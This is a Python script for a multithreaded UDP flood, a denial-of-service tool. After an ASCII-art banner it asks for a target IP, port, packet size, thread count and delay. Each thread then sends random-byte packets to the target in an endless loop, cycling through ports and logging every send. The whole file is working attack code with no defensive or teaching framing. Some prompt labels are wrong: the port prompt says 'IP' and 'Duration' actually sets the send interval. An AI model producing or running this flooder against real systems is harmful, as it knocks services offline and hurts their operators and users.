#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import socket
import random
import threading
from datetime import datetime
from django.core.validators import validate_ipv46_address
from django.core.exceptions import ValidationError



LOG_FILE = "attack_log.txt"

# Logger
def log_message(message: str):
    with open(LOG_FILE, "a") as log_file:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"[{timestamp}] {message}\n")
    print(message)
# ASCII art
os.system("clear")
logo = """
\033[38;5;220m
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒╔════╗▒╔════╗▒╔══╗▒▒▒╔╗╔═════╗╔╗▒▒▒▒▒╔╗╔═╗▒▒▒▒╔═╗▒▒▒▒▒╔═╗▒▒▒▒╔═╗▒▒▒
▒▒▒╔╝╔══╗║╔╝╔══╗╚╗║╔╗║▒▒▒║║║╔═══╗║║║▒▒▒▒▒║║╚╗╚╗▒▒╔╝╔╝▒▒▒▒▒╚╗╚╗▒▒╔╝╔╝▒▒▒
▒▒▒║╔╝▒▒╚╝║╔╝▒▒╚╗║║║║╚╗▒▒║║║║▒▒▒╚╝║║▒▒▒▒▒║║▒╚╗╚══╝╔╝▒▒▒▒▒▒▒╚╗╚══╝╔╝▒▒▒▒
▒▒▒║║▒▒▒▒▒║║▒▒▒▒║║║║╚╗╚╗▒║║║║▒▒▒▒▒║║▒▒▒▒▒║║▒▒╚▒▒▒▒╝▒▒╔═══╗▒▒╚▒▒▒▒╝▒▒▒▒▒
▒▒▒║║▒▒▒╔╗║║▒▒▒▒║║║║▒╚╗╚╗║║║╚═══╗▒║║▒▒▒╔╗║║▒╔╝╔══╗╚╗▒╚═══╝▒╔╝╔══╗╚╗▒▒▒▒
▒▒▒╚╗╚══╝║╚╗╚══╝╔╝║║▒▒║ ╚╝║║╔═══╝▒║╚═══╝║║║╔╝╔╝▒▒╚╗╚╗▒▒▒▒▒╔╝╔╝▒▒╚╗╚╗▒▒▒
▒▒▒▒╚════╝▒╚════╝▒╚╝▒▒╚═══╝╚╝▒▒▒▒▒╚═════╝╚╝╚═╝▒▒▒▒╚═╝▒▒▒▒▒╚═╝▒▒▒▒╚═╝▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\033[0m
"""
# Validate target IP
def validate_ip(ip: str):
    try:
        validate_ipv46_address(ip)
        return True
    except ValidationError:
        return False

# Attack function
def attack(ip: str, port: int, packet_size: int, rate_limit: float):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(packet_size)
    sent = 0
    try:
        while True:
            sock.sendto(data, (ip, port))
            sent += 1
            log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[37m•> {ip} \033[3mport:\033[0m\033[96m{port} \033[36mSent•> \033[37m{sent} \033[3mthreads\033[0m\033[38;5;220m•> {threading.get_ident()}")
            log_message(f"\033[38;5;220mIp Address\033[38;5;39m•> {ip} \033[3mport:\033[0m\033[37m{port}\033[0m \033[94mSent•> \033[31m{sent} \033[3mpacket_size\033[0m\033[37m•> {packet_size}")
            port = port + 1 if port < 65534 else 1
            time.sleep(rate_limit)
    except KeyboardInterrupt:
        log_message("Attack interrupted by user.")
    except Exception as e:
        log_message(f"Error in thread {threading.get_ident()}: {e}")
    finally: 
        sock.close()

# Main script execution
def main():
    os.system("clear")
    print(logo)
    print("\033[33m┏━━━⬣")
    ip = input("\033[33m┗━> IP: \033[32m").strip()
    if not validate_ip(ip):
        log_message("\033[31m==⟩ Invalid IP address. Exiting...")
        sys.exit(1)

    try:
        port = int(input("\033[33m┗━> IP [default 80]: \033[32m").strip() or 80)
        packet_size = int(input("\033[33m┗━> Size [default 1490 bytes]: \033[32m").strip() or 1490)
        threads = int(input("\033[33m┗━> Number Of threads [default 4]: \033[32m").strip() or 4)
        rate_limit = float(input("\033[33m┗━> Duration [seconds]: \033[32m").strip() or 0.01)
    except ValueError:
        log_message("Invalid input provided. Exiting...")
        sys.exit(1)

    os.system("clear")
    print(logo)
    log_message(f"Starting attack on {ip}:{port} with {threads} threads.")
    print(" [+] Press Ctrl+C to stop the attack.")

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, packet_size, rate_limit))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)

    try:
        for thread in thread_list:
            thread.join()
    except KeyboardInterrupt:
        log_message("\033[92m Finally Attack.\033[0m")

if __name__ == "__main__":
    main()
